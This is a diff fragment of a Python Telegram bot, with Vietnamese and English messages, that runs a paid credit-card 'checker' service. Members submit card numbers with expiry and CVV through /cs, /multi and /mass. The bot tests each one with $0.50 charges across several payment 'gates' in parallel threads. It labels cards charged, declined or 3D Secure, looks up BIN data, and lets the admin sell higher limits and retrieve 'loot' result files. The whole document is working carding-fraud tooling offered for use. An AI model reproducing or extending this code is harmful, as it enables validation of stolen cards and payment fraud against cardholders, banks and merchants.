+    await update.message.reply_text(f"🆔 ID Telegram của bạn là: `{update.effective_user.id}`")
+
+async def get_help_text(user: User, lang_code: str):
+    user_id = user.id
+    user_mass_limit = get_user_limit(user_id)
+    user_multi_limit = get_user_multi_limit(user_id)
+
+    gate_names = {
+        '1': "Charge 0.5 (Gate 1)",
+        '2': "Charge 0.5 V2 (Gate 2)",
+        '3': "Charge 0.5 V3 (Gate 3)",
+        '4': "Charge 0.5 V4 (Gate 4)"
+    }
+    active_gate = get_active_gate()
+    active_gate_name = gate_names.get(active_gate, 'Không xác định')
+    gate_status_line_vi = f"\nℹ️ **Cổng check hiện tại:** `{active_gate_name}`"
+    gate_status_line_en = f"\nℹ️ **Current Check Gate:** `{active_gate_name}`"
+    
+    text_vi = {
+        "public": (
+            "**Bảng Lệnh Công Khai** 🛠️\n"
+            "Chào mừng bạn! Dưới đây là các lệnh cơ bản bạn có thể sử dụng:\n\n"
+            "🔹 `/start`\n"
+            "   - *Mô tả:* Khởi động bot và nhận ID Telegram của bạn.\n\n"
+            "🔹 `/info`\n"
+            "   - *Mô tả:* Lấy lại ID Telegram của bạn một cách nhanh chóng.\n\n"
+            "🔹 `/help`\n"
+            "   - *Mô tả:* Hiển thị bảng trợ giúp này.\n\n"
+            f"**Nâng cấp Premium:**\nĐể sử dụng các tính năng check không giới hạn, vui lòng liên hệ Admin: {ADMIN_USERNAME}"
+        ),
+        "member": (
+            "**Bảng Lệnh Thành Viên** 👤\n"
+            "Bạn đã được cấp quyền! Sử dụng các lệnh sau để check thẻ:\n\n"
+            "🔹 `/cs <thẻ>`\n"
+            "   - *Mô tả:* Kiểm tra một thẻ tín dụng duy nhất.\n\n"
+            "🔹 `/bin <bin>`\n"
+            "   - *Mô tả:* Lấy thông tin của một đầu số thẻ (BIN).\n\n"
+            "🔹 `/multi`\n"
+            f"   - *Mô tả:* Kiểm tra nhiều thẻ trong một tin nhắn (tối đa {user_multi_limit} thẻ).\n\n"
+            "🔹 `/mass<số luồng>`\n"
+            "   - *Mô tả:* Kiểm tra hàng loạt thẻ từ một tệp `.txt`.\n\n"
+            "🔹 `/stop`\n"
+            "   - *Mô tả:* Dừng tác vụ `/mass` hoặc `/multi` đang chạy của bạn.\n\n"
+            f"💳 **Hạn mức của bạn:** `{user_mass_limit}` lines/file.\n"
+            f"🌟 **Nâng cấp Premium:** Liên hệ {ADMIN_USERNAME} để check không giới hạn."
+        )
+    }
+    
+    text_en = {
+        "public": (
+            "**Public Command Menu** 🛠️\n"
+            "Welcome! Here are the basic commands you can use:\n\n"
+            "🔹 `/start`\n"
+            "   - *Description:* Starts the bot and gets your Telegram ID.\n\n"
+            "🔹 `/info`\n"
+            "   - *Description:* Quickly retrieves your Telegram ID again.\n\n"
+            "🔹 `/help`\n"
+            "   - *Description:* Displays this help menu.\n\n"
+            f"**Upgrade to Premium:**\nTo use unlimited checking features, please contact the Admin: {ADMIN_USERNAME}"
+        ),
+        "member": (
+            "**Member Command Menu** 👤\n"
+            "You are authorized! Use these commands to check cards:\n\n"
+            "🔹 `/cs <card>`\n"
+            "   - *Description:* Checks a single credit card.\n\n"
+            "🔹 `/bin <bin>`\n"
+            "   - *Description:* Retrieves information for a card's BIN.\n\n"
+            "🔹 `/multi`\n"
+            f"   - *Description:* Checks multiple cards in one message (max {user_multi_limit} cards).\n\n"
+            "🔹 `/mass<threads>`\n"
+            "   - *Description:* Checks a list of cards from a `.txt` file.\n\n"
+            "🔹 `/stop`\n"
+            "   - *Description:* Stops your currently running /mass or /multi task.\n\n"
+            f"💳 **Your Limit:** `{user_mass_limit}` lines/file.\n"
+            f"🌟 **Upgrade to Premium:** Contact {ADMIN_USERNAME} for unlimited checking."
+        )
+    }
+
+    admin_commands = (
+        "**Bảng Lệnh Quản Trị Viên** 👑\n"
+        "Toàn quyền quản lý bot với các lệnh sau:\n\n"
+        "**Quản lý Bot:**\n"
+        "🔹 `/on`, `/off` - Bật/Tắt bot.\n"
+        "🔹 `/status` - Kiểm tra trạng thái các cổng check.\n"
+        "🔹 `/gate [1|2|3|4]` - Đổi cổng check.\n"
+        "🔹 `/stop <user_id>` - Dừng task của user.\n\n"
+        "**Quản lý User & Tin nhắn:**\n"
+        "🔹 `/add <user_id>`\n"
+        "🔹 `/ban <user_id>`\n"
+        "🔹 `/show` - Xem danh sách user.\n"
+        "🔹 `/send <user_id> <tin_nhắn>`\n"
+        "🔹 `/sendall <tin_nhắn>`\n\n"
+        "**Quản lý Giới hạn:**\n"
+        "🔹 `/addlimit <user_id> <số>`\n"
+        "🔹 `/addlimitmulti <user_id> <số>`\n\n"
+        "**Giám sát & Lịch sử:**\n"
+        "🔹 `/showcheck` - Xem thống kê check.\n"
+        "🔹 `/lootfile <user_id>` - Lấy lại file kết quả."
+    )
+
+    lang_texts = text_vi if lang_code == 'vi' else text_en
+    gate_status_line = gate_status_line_vi if lang_code == 'vi' else gate_status_line_en
+    
+    if user_id == ADMIN_ID:
+        return f"{admin_commands}{gate_status_line_vi}\n\n{text_vi['member'].split('💳 **Hạn mức của bạn:**')[0].strip()}"
+    elif user_id in load_users():
+        return f"{lang_texts['member']}{gate_status_line}\n\n{lang_texts['public']}"
+    else:
+        return lang_texts['public']
+
+async def help_command(update, context):
+    user = update.effective_user
+    lang = get_user_lang(user.id)
+
+    if not lang:
+        keyboard = [
+            [
+                InlineKeyboardButton("🇻🇳 Tiếng Việt", callback_data="setlang_vi"),
+                InlineKeyboardButton("🇬🇧 English", callback_data="setlang_en"),
+            ]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await update.message.reply_text(
+            "Vui lòng chọn ngôn ngữ của bạn / Please select your language:",
+            reply_markup=reply_markup
+        )
+    else:
+        help_text = await get_help_text(user, lang)
+        await update.message.reply_text(help_text, disable_web_page_preview=True)
+
+# ... (Các hàm add, ban, show, addlimit không thay đổi)
+async def add_user(update, context):
+    if update.effective_user.id != ADMIN_ID: return
+    if not context.args: await update.message.reply_text("Cú pháp: `/add <user_id>`"); return
+    try:
+        user_to_add = int(context.args[0]); users = load_users()
+        if user_to_add in users:
+            await update.message.reply_text(f"ℹ️ Người dùng `{user_to_add}` đã có trong danh sách.")
+        else:
+            users.add(user_to_add); save_users(users)
+            await update.message.reply_text(f"✅ Đã thêm người dùng `{user_to_add}`.")
+    except ValueError: await update.message.reply_text("❌ User ID không hợp lệ.")
+
+async def ban_user(update, context):
+    if update.effective_user.id != ADMIN_ID: return
+    if not context.args: await update.message.reply_text("Cú pháp: `/ban <user_id>`"); return
+    try:
+        user_to_ban = int(context.args[0]); users = load_users()
+        if user_to_ban in users:
+            users.discard(user_to_ban); save_users(users)
+            user_log_dir = os.path.join(LOG_DIR, str(user_to_ban))
+            if os.path.exists(user_log_dir):
+                shutil.rmtree(user_log_dir)
+            await update.message.reply_text(f"🗑 Đã xóa người dùng `{user_to_ban}` và toàn bộ log.")
+        else:
+            await update.message.reply_text(f"ℹ️ Không tìm thấy người dùng `{user_to_ban}`.")
+    except ValueError: await update.message.reply_text("❌ User ID không hợp lệ.")
+
+async def show_users(update, context):
+    if update.effective_user.id != ADMIN_ID: return
+    users = load_users()
+    if not users:
+        await update.message.reply_text("📭 Danh sách người dùng trống."); return
+    
+    message_lines = ["👥 **Danh sách ID & Hạn mức:**\n"]
+    for user_id in sorted(list(users)):
+        limit_mass = get_user_limit(user_id)
+        limit_multi = get_user_multi_limit(user_id)
+        message_lines.append(f"- `{user_id}` | Mass: `{limit_mass}` | Multi: `{limit_multi}`")
+        
+    await update.message.reply_text("\n".join(message_lines))
+
+async def add_limit_command(update, context):
+    if update.effective_user.id != ADMIN_ID: return
+    if len(context.args) != 2:
+        await update.message.reply_text("Cú pháp: `/addlimit <user_id> <số_dòng_thêm>`"); return
+    try:
+        target_user_id_str, amount_to_add_str = context.args
+        amount_to_add = int(amount_to_add_str)
+        if not target_user_id_str.isdigit() or amount_to_add <= 0:
+            raise ValueError
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Dữ liệu không hợp lệ. Hãy chắc chắn ID và số lượng là số."); return
+
+    limits = load_json_file(LIMIT_FILE)
+    old_limit = int(limits.get(target_user_id_str, DEFAULT_MEMBER_LIMIT))
+    new_limit = old_limit + amount_to_add
+    limits[target_user_id_str] = new_limit
+    save_json_file(LIMIT_FILE, limits)
+    
+    await update.message.reply_text(f"✅ **Cập nhật giới hạn /mass thành công!**\n\n"
+                                        f"👤 **User ID:** `{target_user_id_str}`\n"
+                                        f"📈 **Giới hạn cũ:** `{old_limit}`\n"
+                                        f"➕ **Đã thêm:** `{amount_to_add}`\n"
+                                        f"📊 **Tổng mới:** `{new_limit}`")
+
+async def add_multi_limit_command(update, context):
+    if update.effective_user.id != ADMIN_ID: return
+    if len(context.args) != 2:
+        await update.message.reply_text("Cú pháp: `/addlimitmulti <user_id> <số_thẻ_thêm>`"); return
+    try:
+        target_user_id_str, amount_to_add_str = context.args
+        amount_to_add = int(amount_to_add_str)
+        if not target_user_id_str.isdigit() or amount_to_add <= 0:
+            raise ValueError
+    except (ValueError, IndexError):
+        await update.message.reply_text("❌ Dữ liệu không hợp lệ. Hãy chắc chắn ID và số lượng là số."); return
+
+    limits = load_json_file(MULTI_LIMIT_FILE)
+    old_limit = int(limits.get(target_user_id_str, DEFAULT_MULTI_LIMIT))
+    new_limit = old_limit + amount_to_add
+    limits[target_user_id_str] = new_limit
+    save_json_file(MULTI_LIMIT_FILE, limits)
+    
+    await update.message.reply_text(f"✅ **Cập nhật giới hạn /multi thành công!**\n\n"
+                                        f"👤 **User ID:** `{target_user_id_str}`\n"
+                                        f"📈 **Giới hạn cũ:** `{old_limit}`\n"
+                                        f"➕ **Đã thêm:** `{amount_to_add}`\n"
+                                        f"📊 **Tổng mới:** `{new_limit}`")
+
+async def bin_command(update, context):
+    user = update.effective_user
+    if user.id != ADMIN_ID and user.id not in load_users():
+        await update.message.reply_text(f"Bạn không được phép sử dụng lệnh này. Vui lòng liên hệ Admin: {ADMIN_USERNAME}")
+        return
+
+    if not context.args or not context.args[0].isdigit() or not (6 <= len(context.args[0]) <= 8):
+        await update.message.reply_text("Vui lòng cung cấp một BIN hợp lệ (6-8 chữ số).\nSử dụng: `/bin <bin_number>`")
+        return
+    
+    bin_to_check = context.args[0]
+    msg = await update.message.reply_text(f"⏳ Đang kiểm tra BIN `{bin_to_check}`...")
+
+    try:
+        session = requests.Session()
+        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        session.headers.update({"User-Agent": ua})
+        
+        bin_url = "https://bins.antipublic.cc/bins/" + bin_to_check
+        bin_response, error = make_request_with_retry(session, 'get', bin_url, timeout=10)
+
+        if error or not bin_response or bin_response.status_code != 200 or "not found" in bin_response.text.lower():
+            await msg.edit_text(f"❌ Không tìm thấy thông tin cho BIN `{bin_to_check}`.")
+            return
+
+        bin_info = bin_response.json()
+
+        brand = (bin_info.get('brand') or 'N/A').upper()
+        card_type = (bin_info.get('type') or 'N/A').upper()
+        level = (bin_info.get('level') or 'N/A').upper()
+        bank = bin_info.get('bank') or 'None'
+        country_name = (bin_info.get('country_name') or 'N/A').upper()
+        country_code = bin_info.get('country_code')
+        flag = get_flag_emoji(country_code)
+
+        bin_info_parts = [p for p in [brand, card_type, level] if p and p != 'N/A']
+        bin_info_line = " – ".join(bin_info_parts)
+        
+        response_text = (
+            f"🆔 **BIN:** {bin_info_line}\n"
+            f"🏛️ **Bank:** {bank}\n"
+            f"🌐 **Country:** {country_name} {flag}"
+        )
+
+        final_message = f"ℹ️ **BIN Info:** `{bin_to_check}`\n\n{response_text}"
+        await msg.edit_text(final_message)
+
+    except json.JSONDecodeError:
+        await msg.edit_text(f"❌ Lỗi khi phân tích dữ liệu từ API cho BIN `{bin_to_check}`.")
+    except Exception as e:
+        logger.error(f"Lỗi trong /bin: {e}", exc_info=True)
+        await msg.edit_text(f"⛔️ **Lỗi Hệ Thống:** `{e}`")
+
+async def cs_command(update, context):
+    user = update.effective_user
+    
+    if user.id != ADMIN_ID and user.id not in load_users():
+        await update.message.reply_text(f"Bạn không được phép sử dụng lệnh này. Vui lòng liên hệ Admin: {ADMIN_USERNAME}")
+        return
+    if user.id != ADMIN_ID and not is_bot_on():
+        lang = get_user_lang(user.id) or 'en'
+        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
+        await update.message.reply_text(message)
+        return
+
+    if not context.args: await update.message.reply_text("Sử dụng: `/cs cc|mm|yy|cvv` hoặc `/cs cc|mm/yy|cvv`"); return
+    
+    line = " ".join(context.args)
+    msg = await update.message.reply_text("⏳ *Checking your card, please wait...*")
+    start_time = time.time()
+    try:
+        status, original_line, full_response, bin_info = await asyncio.to_thread(check_card, line)
+        duration = time.time() - start_time
+
+        active_gate = get_active_gate()
+        gate_name = f"Charge 0.5$ V{active_gate} Auth Api" if active_gate in ['2', '3', '4'] else "Charge 0.5$ Auth Api"
+
+        is_vn_decline = status == 'decline' and full_response == 'VIETNAM_BIN_DECLINE'
+        is_invalid_bin_decline = status == 'decline' and full_response == 'INVALID_BIN_DECLINE'
+        is_expired_card_decline = status == 'decline' and full_response == 'EXPIRED_CARD_DECLINE'
+        is_invalid_cardnumber_decline = status == 'decline' and full_response == 'INVALID_CARDNUMBER_DECLINE'
+
+        if is_invalid_bin_decline:
+            final_message = (f"**💠 CARD CHECK RESULT 💠**\n\n"
+                                f"**💳 Card:** `{original_line}`\n"
+                                f"**🚦 Status: ❌ DECLINED**\n"
+                                f"**💬 Response:** `Invalid Card Number (BIN not found)`\n\n"
+                                f"**🏦 Gateway:** `BIN Check`\n\n"
+                                f"**⏱️ Took:** `{duration:.2f}s`\n\n"
+                                f"👤 *Checker by: {ADMIN_USERNAME}*")
+        elif is_invalid_cardnumber_decline:
+            final_message = (f"**💠 CARD CHECK RESULT 💠**\n\n"
+                                f"**💳 Card:** `{original_line}`\n"
+                                f"**🚦 Status: ❌ DECLINED**\n"
+                                f"**💬 Response:** `Invalid Card Number`\n\n"
+                                f"**🏦 Gateway:** `Datatrans Tokenize`\n\n"
+                                f"**⏱️ Took:** `{duration:.2f}s`\n\n"
+                                f"👤 *Checker by: {ADMIN_USERNAME}*")
+        elif is_expired_card_decline:
+            final_message = (f"**💠 CARD CHECK RESULT 💠**\n\n"
+                                f"**💳 Card:** `{original_line}`\n"
+                                f"**🚦 Status: ❌ DECLINED**\n"
+                                f"**💬 Response:** `Card Expired`\n\n"
+                                f"**🏦 Gateway:** `Pre-Check`\n\n"
+                                f"**⏱️ Took:** `{duration:.2f}s`\n\n"
+                                f"👤 *Checker by: {ADMIN_USERNAME}*")
+        elif is_vn_decline:
+            final_message = (f"**💠 CARD CHECK RESULT 💠**\n\n"
+                                f"**💳 Card:** `{original_line}`\n"
+                                f"**🚦 Status: ❌ DECLINED**\n"
+                                f"**💬 Response:** `DECLINED (Vietnam BIN)`\n\n"
+                                f"**🏦 Gateway:** `{gate_name}`\n\n"
+                                f"**⏱️ Took:** `{duration:.2f}s`\n\n"
+                                f"👤 *Checker by: {ADMIN_USERNAME}*")
+        else:
+            status_map = {
+                'success': ("✅ CHARGED 0.5$", "Transaction successful!"),
+                'decline': ("❌ DECLINED", "Transaction declined by issuing bank."),
+                'custom': ("🔒 3D SECURE", "3D Secure authentication required."),
+                'invalid_format': ("📋 FORMAT ERROR", full_response),
+                'error': ("❗️ ERROR", full_response),
+                'unknown': ("❔ UNKNOWN", "Could not determine card status."),
+            }
+            status_text, response_message = status_map.get(status, status_map['unknown'])
+            
+            brand = (bin_info.get('brand') or 'N/A').upper()
+            card_type = (bin_info.get('type') or 'N/A').upper()
+            level = (bin_info.get('level') or 'N/A').upper()
+            bank = bin_info.get('bank') or 'None'
+            country_name = (bin_info.get('country_name') or 'N/A').upper()
+            country_code = bin_info.get('country_code')
+            flag = get_flag_emoji(country_code)
+            
+            bin_info_parts = [p for p in [brand, card_type, level] if p and p != 'N/A']
+            bin_info_line = " – ".join(bin_info_parts)
+
+            bin_details_str = (
+                f"🆔 **BIN:** {bin_info_line}\n"
+                f"🏛️ **Bank:** {bank}\n"
+                f"🌐 **Country:** {country_name} {flag}"
+            )
+            
+            response_display_part = ""
+            if status in ['invalid_format', 'error', 'unknown']:
+                safe_response = str(response_message)[:1000] 
+                response_display_part = f"**💬 Response:**\n```\n{safe_response}\n```"
+            else:
+                response_display_part = f"**💬 Response:** `{response_message}`"
+
+            final_message = (f"**💠 CARD CHECK RESULT 💠**\n\n"
+                                f"**💳 Card:** `{original_line}`\n"
+                                f"**🚦 Status: {status_text}**\n"
+                                f"{response_display_part}\n\n"
+                                f"ℹ️ **BIN Info:**\n{bin_details_str}\n\n"
+                                f"**🏦 Gateway:** `{gate_name}`\n\n"
+                                f"**⏱️ Took:** `{duration:.2f}s`\n\n"
+                                f"👤 *Checker by: {ADMIN_USERNAME}*")
+        
+        await msg.edit_text(final_message)
+        
+    except Exception as e:
+        logger.error(f"Lỗi trong /cs: {e}", exc_info=True)
+        safe_error_message = str(e).replace('`', "'")
+        await msg.edit_text(f"⛔️ **System Error:**\n```\n{safe_error_message}\n```")
+
+
+async def multi_check_command(update, context):
+    user = update.effective_user
+    
+    if user.id != ADMIN_ID and user.id not in load_users():
+        await update.message.reply_text(f"Bạn không được phép sử dụng lệnh này. Vui lòng liên hệ Admin: {ADMIN_USERNAME}")
+        return
+        
+    if user.id != ADMIN_ID and not is_bot_on():
+        lang = get_user_lang(user.id) or 'en'
+        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
+        await update.message.reply_text(message)
+        return
+        
+    if user.id in ACTIVE_CHECKS:
+        await update.message.reply_text("Bạn đang có một tác vụ check khác đang chạy. Vui lòng chờ nó hoàn thành hoặc dùng /stop.", quote=True)
+        return
+
+    text_content = update.message.text.split('/multi', 1)[-1].strip()
+    if not text_content:
+        await update.message.reply_text("Sử dụng: `/multi` và dán danh sách thẻ của bạn ở dòng dưới."); return
+
+    lines = [line.strip() for line in text_content.splitlines() if line.strip()]
+    total_lines = len(lines)
+
+    if total_lines == 0:
+        await update.message.reply_text("Không có thẻ nào để check."); return
+
+    if user.id != ADMIN_ID:
+        user_limit = get_user_multi_limit(user.id)
+        if total_lines > user_limit:
+            await update.message.reply_text(
+                f"⛔️ **Vượt quá giới hạn!**\n\n"
+                f"Bạn đã gửi `{total_lines}` thẻ, nhưng giới hạn cho lệnh /multi là `{user_limit}` thẻ mỗi lần.\n\n"
+                f"Để tăng hạn mức, vui lòng liên hệ admin {ADMIN_USERNAME}."
+            )
+            return
+
+    gate_names = {'1': "Charge 0.5", '2': "Charge 0.5 V2", '3': "Charge 0.5 V3", '4': "Charge 0.5 V4"}
+    active_gate = get_active_gate()
+    gate_name = gate_names.get(active_gate, f"Gate {active_gate}")
+    
+    status_message = await update.message.reply_text(f"⏳ Đang khởi tạo... Chuẩn bị check `{total_lines}` thẻ qua **{gate_name}**.")
+    start_time = time.time()
+    
+    cancel_event = threading.Event()
+    try:
+        ACTIVE_CHECKS.add(user.id)
+        CANCELLATION_EVENTS[user.id] = cancel_event
+
+        counts = {'success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0, 'unknown': 0, 'cancelled': 0}
+        results = {k: [] for k in counts.keys()}
+        processed_count = 0
+        last_update_time = time.time()
+        num_threads = min(10, total_lines) 
+
+        with ThreadPoolExecutor(max_workers=num_threads) as executor:
+            future_to_line = {executor.submit(check_card, line, cancel_event): line for line in lines}
+            for future in as_completed(future_to_line):
+                if cancel_event.is_set():
+                    counts['cancelled'] += 1
+                    continue
+
+                processed_count += 1
+                try:
+                    status, original_line, full_response, bin_info = future.result()
+                    counts[status] = counts.get(status, 0) + 1
+                    status_icons = {'success': '✅', 'decline': '❌', 'custom': '🔒', 'invalid_format': '📋', 'error': '❗️', 'unknown': '❔', 'cancelled': '🛑'}
+                    
+                    result_line = ""
+                    if status == 'decline':
+                        if full_response == 'VIETNAM_BIN_DECLINE': result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (VN BIN)`"
+                        elif full_response == 'INVALID_BIN_DECLINE': result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (Invalid BIN)`"
+                        elif full_response == 'EXPIRED_CARD_DECLINE': result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (Expired)`"
+                        elif full_response == 'INVALID_CARDNUMBER_DECLINE': result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (Invalid Card Number)`"
+                        else: result_line = f"{status_icons['decline']} `{original_line}`"
+                    elif status == 'invalid_format': result_line = f"{status_icons[status]} `{original_line}` | Lý do: {str(full_response)[:50]}" 
+                    elif status == 'cancelled': continue
+                    else:
+                        bin_str = f"{(bin_info.get('bank') or 'N/A')} - {(bin_info.get('type') or 'N/A')} - {(bin_info.get('brand') or 'N/A')} - {(bin_info.get('country_name') or 'N/A')}"
+                        result_line = f"{status_icons.get(status, '❔')} `{original_line}` | `{bin_str}`"
+
+                    if result_line: results[status].append(result_line)
+
+                except Exception as e:
+                    original_line = future_to_line[future]
+                    logger.error(f"Lỗi khi xử lý future cho thẻ {original_line}: {e}", exc_info=True)
+                    counts['error'] += 1
+                    results['error'].append(f"❗️ `{original_line}` | Lỗi xử lý: {e}")
+
+                if time.time() - last_update_time > 2.0 or processed_count == total_lines:
+                    progress_bar = create_progress_bar(processed_count, total_lines, length=20)
+                    status_text = (
+                        f"**🚀 Checking in progress...**\n{progress_bar}\n"
+                        f"**Gate:** `{gate_name}`\n"
+                        f"**Progress:** `{processed_count}/{total_lines}`\n\n"
+                        f"✅ **Charged:** `{counts['success']}` | ❌ **Declined:** `{counts['decline']}`\n"
+                        f"🔒 **3D Secure:** `{counts['custom']}` | ❔ **Errors:** `{counts['error']}`"
+                    )
+                    try:
+                        await status_message.edit_text(text=status_text)
+                    except telegram.error.BadRequest as e:
+                        if "Message is not modified" not in str(e): logger.warning(f"Lỗi khi cập nhật tiến trình /multi: {e}")
+                        pass
+                    except Exception as e:
+                        logger.error(f"Lỗi không xác định khi cập nhật tiến trình /multi: {e}")
+                    last_update_time = time.time()
+                
+        duration = time.time() - start_time
+        update_user_stats(user.id, user, counts)
+
+        if cancel_event.is_set():
+            await status_message.edit_text(f"🛑 **Tác vụ đã được dừng theo yêu cầu.**\n\nĐã xử lý: {processed_count}/{total_lines} thẻ.")
+            return
+
+        final_message = [
+            f"**📊 Check Complete!**\n",
+            f"**Gate Used:** `{gate_name}`",
+            f"**Total Cards:** `{total_lines}`",
+            f"**Time Taken:** `{duration:.2f}s`\n",
+            f"✅ **Charged:** `{counts['success']}`",
+            f"❌ **Declined:** `{counts['decline']}`",
+            f"🔒 **3D Secure:** `{counts['custom']}`",
+            f"📋 **Invalid Format:** `{counts['invalid_format']}`",
+            f"❗️ **Errors:** `{counts['error']}`\n",
+            f"-----------------------------------------"
+        ]
+
+        if results['success']: final_message.extend(("\n**✅ CHARGED CARDS:**", *results['success']))
+        if results['custom']: final_message.extend(("\n**🔒 3D SECURE CARDS:**", *results['custom']))
+        if results['decline']: final_message.extend(("\n**❌ DECLINED CARDS:**", *results['decline']))
+        if results['invalid_format']: final_message.extend(("\n**📋 INVALID FORMAT:**", *results['invalid_format']))
+        if results['error']: final_message.extend(("\n**❗️ ERRORS:**", *results['error']))
+
+        final_text = "\n".join(final_message)
+        
+        if len(final_text) > 4096:
+            await status_message.edit_text("Kết quả quá dài để hiển thị. Sẽ được gửi dưới dạng file.")
+            with io.BytesIO(final_text.encode('utf-8')) as file_to_send:
+                await context.bot.send_document(chat_id=update.effective_chat.id, document=file_to_send, filename="multi_check_results.txt")
+        else:
+            await status_message.edit_text(final_text)
+
+    except Exception as e:
+        logger.error(f"Lỗi trong /multi: {e}", exc_info=True)
+        await status_message.edit_text(f"⛔️ **Lỗi nghiêm trọng!**\n```\n{str(e).replace('`', '')}\n```")
+    finally:
+        ACTIVE_CHECKS.discard(user.id)
+        CANCELLATION_EVENTS.pop(user.id, None)
+
+async def mass_check_handler(update, context):
+    user = update.effective_user
+    
+    if user.id != ADMIN_ID and user.id not in load_users():
+        await update.message.reply_text(f"Bạn không được phép sử dụng lệnh này. Vui lòng liên hệ Admin: {ADMIN_USERNAME}")
+        return
+        
+    if user.id != ADMIN_ID and not is_bot_on():
+        lang = get_user_lang(user.id) or 'en'
+        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
+        await update.message.reply_text(message)
+        return
+    
+    if user.id in ACTIVE_CHECKS:
+        logger.warning(f"User {user.id} ({user.full_name}) tried to spam /mass.")
+        await update.message.reply_text("Bạn đang có một tác vụ check khác đang chạy. Vui lòng chờ nó hoàn thành hoặc dùng /stop.", quote=True)
+        return 
+
+    if not update.message.document: await update.message.reply_text("Please attach a .txt file."); return
+    document = update.message.document
+    if not document.file_name.lower().endswith('.txt'): await update.message.reply_text("Only .txt files are accepted."); return
+    
+    file = await context.bot.get_file(document.file_id)
+    file_content = (await file.download_as_bytearray()).decode('utf-8')
+    lines = [line for line in file_content.splitlines() if line.strip()]
+    total_lines = len(lines)
+
+    if not lines: await update.message.reply_text("📂 The file is empty."); return
+    
+    if user.id != ADMIN_ID:
+        user_limit = get_user_limit(user.id)
+        if total_lines > user_limit:
+            await update.message.reply_text(
+                f"⛔️ **Vượt quá giới hạn!**\n\n"
+                f"Tệp của bạn có `{total_lines}` dòng, nhưng giới hạn của bạn là `{user_limit}` dòng.\n\n"
+                f"Vui lòng liên hệ admin {ADMIN_USERNAME} để tăng hạn mức."
+            )
+            return
+
+    caption = update.message.caption or "/mass"
+    
+    requested_threads_match = re.match(r'/mass(\d+)', caption)
+    requested_threads = int(requested_threads_match.group(1)) if requested_threads_match and requested_threads_match.group(1) else 10
+
+    if user.id != ADMIN_ID:
+        num_threads = min(requested_threads, MEMBER_THREAD_LIMIT)
+        if requested_threads > MEMBER_THREAD_LIMIT:
+            await update.message.reply_text(
+                f"⚠️ **Giới hạn luồng!** Thành viên chỉ được dùng tối đa {MEMBER_THREAD_LIMIT} luồng. Đã tự động điều chỉnh.",
+                quote=True
+            )
+    else:
+        num_threads = min(requested_threads, 50)
+
+    num_threads = max(1, num_threads)
+
+    gate_names = {'1': "Charge 0.5", '2': "Charge 0.5 V2", '3': "Charge 0.5 V3", '4': "Charge 0.5 V4"}
+    active_gate = get_active_gate()
+    gate_name = gate_names.get(active_gate, f"Gate {active_gate}")
+
+    session_timestamp = datetime.now(VIETNAM_TZ).strftime("%Y%m%d-%H%M%S")
+    session_dir = os.path.join(LOG_DIR, str(user.id), session_timestamp)
+    os.makedirs(session_dir, exist_ok=True)
+    
+    status_message = await update.message.reply_text(f"⏳ Khởi tạo... Chuẩn bị check `{total_lines}` thẻ với `{num_threads}` luồng qua **{gate_name}**.")
+    start_time = time.time()
+    
+    cancel_event = threading.Event()
+    try:
+        ACTIVE_CHECKS.add(user.id)
+        CANCELLATION_EVENTS[user.id] = cancel_event
+
+        counts = {'success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0, 'unknown': 0, 'cancelled': 0}
+        result_lists = {k: [] for k in counts.keys()}
+        result_lists['error_debug'] = []
+        processed_count = 0
+        last_update_time = time.time()
+
+        with ThreadPoolExecutor(max_workers=num_threads) as executor:
+            future_to_line = {executor.submit(check_card, line, cancel_event): line for line in lines}
+            for future in as_completed(future_to_line):
+                if cancel_event.is_set():
+                    counts['cancelled'] += 1
+                    continue
+
+                processed_count += 1
+                try:
+                    status, original_line, full_response, bin_info = future.result()
+                    counts[status] = counts.get(status, 0) + 1
+                    
+                    line_to_save = ""
+                    if status == 'decline':
+                        if full_response == 'VIETNAM_BIN_DECLINE': line_to_save = f"{original_line} | DECLINED (VN BIN)"
+                        elif full_response == 'INVALID_BIN_DECLINE': line_to_save = f"{original_line} | DECLINED (Invalid BIN)"
+                        elif full_response == 'EXPIRED_CARD_DECLINE': line_to_save = f"{original_line} | DECLINED (Expired)"
+                        elif full_response == 'INVALID_CARDNUMBER_DECLINE': line_to_save = f"{original_line} | DECLINED (Invalid Card Number)"
+                        else: line_to_save = f"{original_line} | DECLINED"
+                    elif status == 'invalid_format': line_to_save = f"{original_line} | Reason: {full_response}"
+                    elif status == 'cancelled': continue
+                    else:
+                        bin_str = f"| {(bin_info.get('bank') or 'N/A')} - {(bin_info.get('type') or 'N/A')} - {(bin_info.get('brand') or 'N/A')} - {(bin_info.get('country_name') or 'N/A')}"
+                        line_to_save = f"{original_line} {bin_str}"
+                    
+                    if line_to_save: result_lists[status].append(line_to_save)
+
+                    if status in ['error', 'unknown']:
+                        debug_info = f"Card: {original_line}\nResponse: {str(full_response)[:3500]}"
+                        result_lists['error_debug'].append(debug_info)
+                        if user.id != ADMIN_ID:
+                            await context.bot.send_message(chat_id=ADMIN_ID, text=f"🐞 DEBUG ALERT (user {user.id}):\n{debug_info}")
+                except Exception as e:
+                    original_line = future_to_line[future]
+                    logger.error(f"Lỗi khi xử lý future cho thẻ {original_line} trong /mass: {e}", exc_info=True)
+                    counts['error'] += 1
+                    result_lists['error'].append(f"{original_line} | Lỗi xử lý: {e}")
+
+                if time.time() - last_update_time > 2.0 or processed_count == total_lines:
+                    progress_bar = create_progress_bar(processed_count, total_lines, length=20)
+                    status_text = (f"**🚀 Checking in progress...**\n{progress_bar}\n"
+                                    f"**Gate:** `{gate_name}` | **Threads:** `{num_threads}`\n"
+                                    f"**Progress:** `{processed_count}/{total_lines}`\n\n"
+                                    f"✅ **Charged:** `{counts['success']}`\n"
+                                    f"❌ **Declined:** `{counts['decline']}`\n"
+                                    f"🔒 **3D Secure:** `{counts['custom']}`\n"
